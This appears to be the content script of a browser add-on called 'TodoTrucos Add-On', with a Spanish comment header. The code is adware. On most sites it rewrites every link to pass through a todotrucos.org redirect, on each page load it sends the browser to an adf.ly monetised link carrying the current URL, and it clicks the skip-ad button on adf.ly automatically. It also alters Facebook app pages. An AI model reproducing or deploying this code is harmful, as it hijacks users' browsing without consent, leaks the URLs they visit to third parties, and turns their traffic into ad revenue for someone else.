// Comentarios del codigo ut.js de TodoTrucos Add-On v 0.1.0

if (document.URL.indexOf("google.com") == -1 && document.URL.indexOf("apps.facebook.com") == -1 && document.URL.indexOf("todotrucos.org") == -1){
	var links = document.getElementsByTagName("a");
	for(i=0;i<links.length;i++) 
	{
		links[i].href = "http://www.todotrucos.org/h42-redirect?" + links[i].href;
	}
}


var lista = [];
//cada ves que abro una pagina
if(lista.indexOf(window.location.host) == -1){
	lista.push(window.location.host);
	window.location.href = "http://adf.ly/4531564/"+document.URL;
}

if (document.URL.indexOf("apps.facebook.com") != -1 && document.URL.indexOf("todotrucos.org/h42-redirect") == -1) {
	var app = document.URL.replace("https://apps.facebook.com/", "");
	var applen = app.indexOf("/");
	var app = app.slice(0,applen);
	document.getElementById("rightCol").innerHTML = app;
}

function adfly(){
	document.getElementById('skip_ad_button').click();
}

if (document.URL.indexOf('adf.ly/') != -1){
	window.setTimeout(adfly,15000);
}


//Events
document.addEventListener("MyAnswerEvent",function(e) { ExtensionAnswer(e); },false);

var element;
function requestList(){
	element = document.createElement("MyExtensionDataElement");
	element.setAttribute("attribute1", "requestList");
	document.documentElement.appendChild(element);

	var evt = document.createEvent("Events");
	evt.initEvent("MyExtensionEvent", true, false);
	element.dispatchEvent(evt);
}

function ExtensionAnswer(EvtAnswer)
{
	lista = element.getAttribute("attribute3");
}